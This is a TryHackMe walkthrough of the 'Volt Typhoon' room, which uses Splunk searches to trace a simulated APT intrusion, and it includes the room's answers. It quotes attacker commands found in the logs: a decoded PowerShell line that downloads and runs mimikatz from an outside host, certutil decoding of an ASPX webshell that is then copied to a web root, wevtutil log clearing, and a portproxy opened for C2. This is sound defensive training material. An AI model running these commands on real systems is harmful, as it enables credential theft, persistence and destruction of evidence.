## Volt Typhoon APT:  TryHackMe Room Write-Up


This is a write-up of the Volt Typhoon challenge on Tryhackme. **Volt Typhoon** is an infamous APT assumed to be of Chinese origin that focus on espionage, data theft, and credential exfiltration.

It has different names from multiple different threat analysis research groups and is very stealthy in their actions post foothold, using nearly entirely only LOLBins (Living off The Land binaries), such as  wmic, ntdsutil, and netsh.

Mitre has a detailed paper highlighting their TTPs, links, and other information regarding this group here: https://attack.mitre.org/groups/G1017/ . CISA also similarily has an analysis here: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a . They have successfully

breached and exploited multiple Western government instituions.


Today we are going to be doing the Splunk focused Tryhackme Challenge that uses the TTPs and the IOCs consistent with this APT based on logs of actual compromises:

## **Basic Intro:**




Firstly we access the Splunk instance, I will not be going over the VPN set up process here as the machine was unaccesible except via Attackbox and etc. When reviewing for this writeup.

The Spunk instance will be your personal target machine's IP and on port 8000.


Select search and reporting to access the logs: <img width="1883" height="824" alt="image" src="https://github.com/user-attachments/assets/41ab1db6-e771-4563-ba38-45c318db4165" />



First thing, change the time index to **All Time** the default is 24 hours, this is to make sure we are not missing any logs and have a comprehensive analysis:


<img width="708" height="565" alt="image" src="https://github.com/user-attachments/assets/a39e4ef8-c119-4905-a9a7-9e7cd2204520" />


Now in the search bar we need to select an **Index** so we can have our main source for logs, type index and select main from the drop down menu or just put Index="main" manually.

 <img width="1907" height="716" alt="image" src="https://github.com/user-attachments/assets/82f5ed71-698b-42ac-acf9-6f397d7ebfd1" />

After enabling the search with the parameters we find there are 2k logs, the logs can be filtered via the **source** and **source** type fields, this will be important for when we are answering specific questions relating to TTPs/IOCs.




## **Initial Access**

We are asked to find how the threat actor gained a foothold; 

<img width="1300" height="295" alt="image" src="https://github.com/user-attachments/assets/c8fef76b-f1c9-4167-b97f-2266abe34025" />

We can check the ADSelfService Plus logs by filtering the main Index log according to the sourcetype "adss"

<img width="867" height="356" alt="image" src="https://github.com/user-attachments/assets/7aef6f5a-ef82-4508-b6c3-5b6d24ec8629" />

After applying this filter we find that we have minimized the logs from 2k to around 650, in order to minimize this further and answer the question we can filter these logs according to action_name and search for logs that contain the user string; 'dean'.


<img width="1736" height="538" alt="image" src="https://github.com/user-attachments/assets/6755523e-724b-4cad-89a9-41ce6d3b6414" />

Through this we drastically minimize the logs and are able to narrow it down to two events that occured at the same time, one being a successful change the other being the failure, and with this we have our timestamp for this action:

<img width="924" height="517" alt="image" src="https://github.com/user-attachments/assets/7a5e1e5a-9fa2-4881-b159-8798820d9756" />

Next Question:

**Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?**

This question has two hints that we can use, firstly that this action is close to the password change we just identified, and that possibly Deans' account was used to make the new account due to the wording of the question

Lets use the same filters as before except changing the action_name to what we have available to us and removing dean just to make sure: <img width="854" height="648" alt="image" src="https://github.com/user-attachments/assets/23659fa6-e0f3-4d75-aa67-d8b69f739489" />

The enrollment action name seems like an action name that could be of use to us, and the log entries for this are few, lets apply and check.


<img width="1564" height="625" alt="image" src="https://github.com/user-attachments/assets/97edcc0f-da9c-4c94-9f31-4a097795bdf8" />

When we check this we see this new user was created at the same hour that Dean's account was compromised and that this user also is an admin user that does not follow the organizations typical naming scheme, we check this and find it is correct.



## **Execution:**

Now that we have passed the Initial Accces/"Foothold" stage we now are going to begin getting into the more detailed sections, the first of them being execution. We know that Volt Typhoon is a very stealthy APT. They nearly always will be using a Windows Binary in order to execute code and evade detection which is important to note when hunting for their IOCs. Here are our first questions:


<img width="1281" height="488" alt="image" src="https://github.com/user-attachments/assets/5cab1493-02d7-436a-b3df-00d517d6f86b" />

The first question we are asked is an indepth one, we need to find a specific command that is being used to enumerate two different servers, let's first reset our filters and see what parameters we have available as a source

<img width="1005" height="571" alt="image" src="https://github.com/user-attachments/assets/1d35403c-9534-432f-9994-a49cc566abc0" />

Ignoring what we already have checked, adss, we see there are a lot of logs with **wmic** and **PowerShell** but we need to narrow it down a bit more. Lets put a filter that excludes **adss** and look for a string that is relevant to the question: lets try the word drive.

<img width="1869" height="661" alt="image" src="https://github.com/user-attachments/assets/47997169-e03a-422b-bf3c-80e2af79944a" />

We see here the attacker is enumerating the environment via the compromised DEAN account, we should note that. Amongst these events there is valuable info but not what we need for this question, lets try the terms server01 and server02


<img width="1824" height="708" alt="image" src="https://github.com/user-attachments/assets/6be37dfc-b479-4619-8c09-b7e648f2cf62" />

Fortanetly, despite our filter having a wide net we only get 11 logs, we can look through these for relevant information

<img width="1644" height="444" alt="image" src="https://github.com/user-attachments/assets/7cc24a8e-095b-47e8-8fdb-71664a653d4f" />


When searching we find a single command executed via wmic, this command contains the two servers, enumeration of their drives, and is running under the comprimised DEAN account, we should check this and see if this is the answer. (Successs).


Now the next question:

**The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?**

As expected our APT is very attached to using Living Off the Land binary techniques, since we know what binary is used in this case we should set a filter for actions executed by that binary and analyze what is found:


lets first just search for the ntdsutil string and see which logs have this name present:

Fortantely we find a single command present usig this dll:

<img width="1905" height="493" alt="image" src="https://github.com/user-attachments/assets/b24fef0a-f23a-48ae-8a60-5f7316c842fc" />

While we do not have the password or the archiving of the database yet, we do have the location to which he copied the AD database and what he copied it as: 

**C:\Windows\Temp\tmp\temp.dit**

We should use this in our next search to see his next actions:

Lets set a filter for the file temp.dit:

<img width="1902" height="605" alt="image" src="https://github.com/user-attachments/assets/4881ec34-2dcc-4aa5-83fd-e64b23d4c725" />


The first event we find we see the archiving action taking place and can see the password he has chosen:

<img width="1627" height="111" alt="image" src="https://github.com/user-attachments/assets/120792e8-037e-46da-b237-d43fdb5a1331" />



Let's put this in and check if we are correct (Success).




## **Persistence**

Here we are going to analyze how Volt Typhoon likes to make a foothold, we are given a hint that this is going to be a base64 encoded webshell:


<img width="1303" height="322" alt="image" src="https://github.com/user-attachments/assets/d3ec5582-7117-4a68-bfdf-b62c832ce812" />

Now just from instincts from doing boxes myself, I autoamtically default that the webshell is going to be present in a temp directory. This is common procedure of threat actors and in pentests as it is not a strictly monitored directory. Lets filter for the temp directory:

<img width="1911" height="699" alt="image" src="https://github.com/user-attachments/assets/54068547-96a6-4fe9-9b97-c54301f84b78" />

There are 32 logs, a bit too much for our liking so we should filter it further. We can check the CommandLine field for anything interesting. 

<img width="1753" height="644" alt="image" src="https://github.com/user-attachments/assets/bee76fca-e124-442e-ba19-f90bebd09866" />


We see that echo is used in the command line once, echo is commonly used while encoding base64 payloads and it only be using once is a reason to investigate, lets set that as our command line filter with the temp string:


<img width="1900" height="717" alt="image" src="https://github.com/user-attachments/assets/f5d8ac92-6c9a-450b-a2b1-a239a1c6b934" />


Immediately we find only one event and can already tell this is most likely malicious, Powershell is running an obfuscated base64 command that is specifically being piped into **ntuser.ini**. This is another example of Volt Typhoon using the LOLBIN technique:


We can decode this payload either in terminal or by using any online base64 decoder by copying and pasting the payload.

<img width="1282" height="929" alt="image" src="https://github.com/user-attachments/assets/d6b0d8a9-0662-4096-82c3-e6dcb1af3ca5" />



After decoding we can clearly see that it is an asp webshell. Infact it actually literally has the word webshell in its title. We know this was put into the **ntuser.ini** file in the **C:\Windows\Temp\** directory so we should provide the C:\Windows\Temp\ directory as our answer (Success).


## **Defense Evasion:**

Our next section of analysis of this APT are their TTPs for **Defense Evasion** we already know they use LOLBins for execution to evade defenses and Base64 encoded commands, however what other tactics do they use in engagement?


<img width="1282" height="541" alt="image" src="https://github.com/user-attachments/assets/5a096f28-94e4-41f0-94ad-0ed94583e1e0" />

**In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?**

Here we are asked to find a powershell script that attempts to remove RDP logs, we can set our source or source type to only the PowerShell logs source to narrow the information:


<img width="1757" height="888" alt="image" src="https://github.com/user-attachments/assets/f9554a23-e936-4fe6-8c02-18778466576f" />


We still have 438 logs which is a problem, lets search for any logs with the string RDP:

<img width="681" height="195" alt="image" src="https://github.com/user-attachments/assets/030efd1a-e6b0-4090-9a6d-d25661e7ac4f" />

No results found. Lets check what relevant CMDLETs are found in the powershell logs:  

<img width="1684" height="851" alt="image" src="https://github.com/user-attachments/assets/083bebbb-df43-4816-9cc3-f8fbe7dac154" />


Remove-Item seems like it could be relevant for our search, lets select it as a filter and see what comes up:


<img width="1641" height="291" alt="image" src="https://github.com/user-attachments/assets/1daaa847-1508-40b4-aa3a-168de202c62c" />


7 events are available and within these Seven we find these:

<img width="1390" height="441" alt="image" src="https://github.com/user-attachments/assets/414ee16b-fafa-49fa-9f82-02b893afe9a6" />

<img width="1453" height="396" alt="image" src="https://github.com/user-attachments/assets/4aed7a4d-af0f-4dcf-a37d-b5cddb5a6d6c" />

This is valuable info but not exactly what we needed, we are not seeing any RDP logs specifically being removed here lets look at any other cmdlets that can help:


One of the CMDLET options available is "Remove-itemProperty", lets see what comes up when we filter for that instead:

<img width="1194" height="777" alt="image" src="https://github.com/user-attachments/assets/25006747-8011-4d31-9a81-da8a22388741" />

We can see that they are removing things according to a specific registry path but we are unaware of the registry path, lets check the hint given for the question.

the hint given is  "T1070.007"  We should search this TTP id in mitre attack and see what comes up:

<img width="1792" height="628" alt="image" src="https://github.com/user-attachments/assets/b26aa456-5683-4f04-9c83-68efa3f3a1d9" />

Ok now we have a bit of a better lead, lets search for these paths:

C:\Users\%username%\AppData\Local\Microsoft\TerminalServer Client\Cache\

C:\Users\%username%\Documents\Default.rdp

To make this quicker you can also just pick a string from the path and see what is present, lets choose "Default"



<img width="1309" height="836" alt="image" src="https://github.com/user-attachments/assets/dfe120d4-b199-41e7-b96e-f81e81da608f" />


Now we found what we were looking for, it is the exact log we were looking for earlier, they however have saved the path as the variable "Registry Path" in order to evade capture, this means the Remove-item logs we found earlier were actually correct, we can sort for logs around this time period to add more evidence that this was their tactic for deleting logs:

Click on time on one of the logs and select 5 minutes and click apply and remove the default string filter:

<img width="431" height="212" alt="image" src="https://github.com/user-attachments/assets/eebd9ba6-6a2e-47f7-a937-d08eb82c24c8" />


<img width="1363" height="882" alt="image" src="https://github.com/user-attachments/assets/5cfc3a75-ba72-4e9b-a41f-3caaa902ee41" />


we find 2 events and they are almost exactly what we are looking for, if you check the other event with the same time you will find the Remove-ItemProperty cmdlet used to remove the log. Lets put Remove-Itemproperty as our answer and continue (it works).



**The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?**

We have actually already uncovered the archive name from before, so it should not be easy finding out what they renamed it to, If you remember from earlier the archive was named first cisco-up.7z and then piped into temp.dit, we just need to search for the original name cisco-up and see what they renamed the file too:

<img width="1896" height="652" alt="image" src="https://github.com/user-attachments/assets/1cbf5775-feb0-470a-b734-ab7f25ea44d8" />

A stealthy psuedo **.gif** file named **cl64.gif**. Lets pass this as our answer and check (Success).


**Under what regedit path does the attacker check for evidence of a virtualized environment?**

This action may be to check if they are in a honeypot or the like.


After searching udner the list of executed Commandline commands; ie the command line field for the powershell log one command sticks out:

_CommandLine="Get-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\""_

Through checking mitreattack and the TTPs of the APT, we can see that this is sometimes queried in order to check if the environment is a virtual machine, Lets select this command and see what events are present:

<img width="1884" height="710" alt="image" src="https://github.com/user-attachments/assets/05eb789a-e974-44b2-a08f-122049088139" />


We can clearly see they are trying to find the keyword Virtual to assess if they are in a virtual machine, lets put this regedit path as our answer: 

**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control**



## **Credential Access**

<img width="1342" height="455" alt="image" src="https://github.com/user-attachments/assets/f4bda555-e186-4acd-b203-0ecff52a4380" />

Here we are introduced to another one of Volt Typhoons tactics, since we are already given the powershell command used we should filter for it and see what is available we use this filter:

**index="main" sourcetype=powershell CommandLine="reg"**  and we find 8 events, this should be easy to sort through.


Within these events we see the three applications they quaery 


<img width="1136" height="853" alt="image" src="https://github.com/user-attachments/assets/489054e0-3283-489f-be5c-83550f71b720" />

<img width="1606" height="866" alt="image" src="https://github.com/user-attachments/assets/566e065d-174d-4c4e-9503-a1cbff5eb018" />



**OpenSSH, Putty, and realVNC.**





**What is the full decoded command the attacker uses to download and run mimikatz?**

Mimikatz is a popular tool for password/hash dumping on windows and is commonly used by pentesters and threat actors alike.

It is important to realize here that they want us to **decode** the command, meaning command itself will be **encoded** so we cannot just search for the string 'mimikatz' and easily find what we are looking for. this APT Tends to use powershell so lets keep our source log on powershell.

Since we know it is a download however, we should try commands with PS that do Downloads

<img width="1894" height="668" alt="image" src="https://github.com/user-attachments/assets/68aecf5e-0ea7-47bb-87cb-e739916bd4d6" />


We don't find anything of substance meaning the cmdlet itself might actually be encoded.

After running through all of the CMDLETs one looks like it could be revelant: the **"-exec" cmdlet**, since the command is also running mimikatz it makes sense this could be relevant, lets set this as our filter


<img width="1917" height="840" alt="image" src="https://github.com/user-attachments/assets/2734b3e6-00a2-426b-a2f4-94736e06a3ce" />


We now have found an extremely suspicious PS command, lets decode it with the base64 decode tool we used earlier:


<img width="988" height="471" alt="image" src="https://github.com/user-attachments/assets/2f6e98ff-7477-499d-9b3b-a42767d547ba" />

And we have found the malicous command and the Invoke Web Request cmdlet we were expecting earlier:

**Invoke-WebRequest -Uri "hxxp://voltyp[.]com/3/tlz/mimikatz[.]exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait****

*Note I have defanged the URL, the answer expects the url to be fanged



## **Discovery and Lateral Movement:**

<img width="1271" height="559" alt="image" src="https://github.com/user-attachments/assets/92a233e9-8c8d-48b1-943a-a9ae8f4b9b5f" />

**The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?
Answer Format: Increasing order separated by a space.**

This is another example of Volt Typhoon using the Living off the Land Technique. we can reset our filters and search for the string **wevtutil**:


<img width="1720" height="703" alt="image" src="https://github.com/user-attachments/assets/ee5edcf1-0907-4db3-8aa2-1480bd9c51ed" />

We have 12 events.

When we check the 12 events we see these 3 EventIDs being queried via wevtutil:

<img width="1577" height="488" alt="image" src="https://github.com/user-attachments/assets/db88f18f-faf4-4c03-8e4f-f6aa572037c1" />

<img width="1536" height="252" alt="image" src="https://github.com/user-attachments/assets/4f84141e-7046-492c-b344-549285951efe" />

**4624, 4625, and 4769** this is our answer.

**Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?**

Being familiar with Webshells I already knew that it was most likely going to be a .asp or .aspx file. We can search for this string extension in the logs and narrow our search down.

<img width="1867" height="713" alt="image" src="https://github.com/user-attachments/assets/163aae1f-c220-4cdd-a4a7-579dda89b07e" />

We find some critical information here:

First, the malicious encoded webshell file in the Temp directory was accessed, it was first decoded and then put into a file called iisstart.aspx.:

**CommandLine=certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx**

Then, on the 29th the new webshell file was moved to server02's public facing webserver as a new name: **"AuditReport.jspx"**

**CommandLine=Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx**

All of this being done through a combination of **certutil** and **Powershell cmdlets**. An example of Volt Typhoon's pattern**.

**AuditReport.jspx** Should be our answer in this case.


## **Collection**

<img width="1536" height="352" alt="image" src="https://github.com/user-attachments/assets/21211aab-a439-45c3-839f-68353859b9c9" />


Here we can limit our log source to the PowerShell logs, we however are not given much information this time around comapred to the other questions. Lets check for powershell commands in the commandline field that have to do with copy:

"Copy-Item" Seems like a good fit:

<img width="1792" height="804" alt="image" src="https://github.com/user-attachments/assets/dcc2d167-60be-4a04-bf27-b5fd9aa16b58" />

We get 11 logs with one of them being the logs of webshell copy we caught earlier

Checking the events we see they are collecting Browser backups


<img width="1091" height="44" alt="image" src="https://github.com/user-attachments/assets/4e06164d-2669-4fab-bf93-93aac8df546f" />


and .csv files that are in a directory called "FinanceBackup" 


<img width="1620" height="727" alt="image" src="https://github.com/user-attachments/assets/e8805fc6-47ad-434e-852f-71cd57bee9ea" />


We find a total of 3 different .csv files copied from that directory and browser information on multiple major web browsers.

We should put the csv file names as our answer: **2022.csv 2023.csv 2024.csv**


## **C2 & Cleanup**

We can see now that Volt Typhoon as acted on their major objectives, now lets see what they perform in their conclusion and clean-up phase:

<img width="706" height="628" alt="image" src="https://github.com/user-attachments/assets/cc3d72fd-bd34-447b-be08-bd9de27f0b1b" />

Lets reset our logs to default and see what fields can help us.

<img width="1828" height="284" alt="image" src="https://github.com/user-attachments/assets/c2d93f4d-ca5f-45e4-ac16-2d7a0126295a" />


Two fields seem very pertinent for this questions, Connect Address and Connect port. Both only contain one value, lets apply this as a filter and see what events are present.


<img width="1619" height="130" alt="image" src="https://github.com/user-attachments/assets/baaadaa7-cec5-4f0f-a4cb-3ee6af061295" />


This is a priveldged command that is opening up the victim machine to the remote ip 10.2.30.1 and port 8443 for future c2 communications, lets provide this as our answer:  **10.2.30.1 8443**

**To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?**

Earlier, we noticed the attacker was clearing multiple types of logs via powershell CMDLET, lets search for that cmdlet again or a similar one and list out the logs removed this time around:

<img width="1754" height="197" alt="image" src="https://github.com/user-attachments/assets/9ee06775-41b7-4bfd-93a2-aa022860a2a2" />

We check this but don't find anything, lets check the hint for a bit of a lead

<img width="368" height="120" alt="image" src="https://github.com/user-attachments/assets/1c4734da-a6bd-44a5-9a86-165623aa988e" />

This is vague, but in the last question they were using wevtutil for logs, lets check for this and see what comes up:


<img width="1877" height="719" alt="image" src="https://github.com/user-attachments/assets/10ef70d8-8244-4053-b0c1-a6a4ca03275b" />


This is suspicious, and after checking this command flag **cl** we find that this is a command to clear all logs for the parameters specificed on the system. Infact this technique is so common there is even a Mitre writeup on using this specifically: https://attack.mitre.org/techniques/T1070/001/

So for our last answer we should provide these log sources:

**Application Security Setup System**

And with that we have completed our analysis of Volt Typhoon.
